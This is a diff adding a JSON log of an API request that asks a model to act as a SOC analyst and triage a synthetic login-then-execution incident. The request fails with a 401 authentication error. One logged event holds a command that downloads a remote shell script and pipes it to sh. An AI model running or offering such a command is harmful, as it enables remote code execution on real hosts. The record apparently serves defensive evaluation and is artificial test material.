@@ -1,0 +1,25 @@
+{
+ "request": {
+  "model": "muse-spark-1.3",
+  "messages": [
+   {
+    "role": "system",
+    "content": "You are a SOC analyst. Answer with JSON only."
+   },
+   {
+    "role": "user",
+    "content": "Incident (synthetic). host web01.example.com; user svc-backup; src 192.0.2.10.\nevents:\n- e1 2026-01-01T10:00:01Z Authentication failure user svc-backup from 192.0.2.10\n- e2 2026-01-01T10:00:09Z Authentication success user svc-backup from 192.0.2.10\n- e3 2026-01-01T10:00:20Z Process Activity cmd_line 'curl http://198.51.100.7/a.sh | sh' by svc-backup\nReturn only JSON: {\"summary\": str, \"suspicious_event_uids\": [str], \"severity_suggestion\": \"low|medium|high\"}"
+   }
+  ],
+  "max_tokens": 3000
+ },
+ "status": 401,
+ "response": {
+  "error": {
+   "code": "invalid_api_key",
+   "message": "Unauthorized",
+   "param": null,
+   "type": "authentication_error"
+  }
+ }
+}
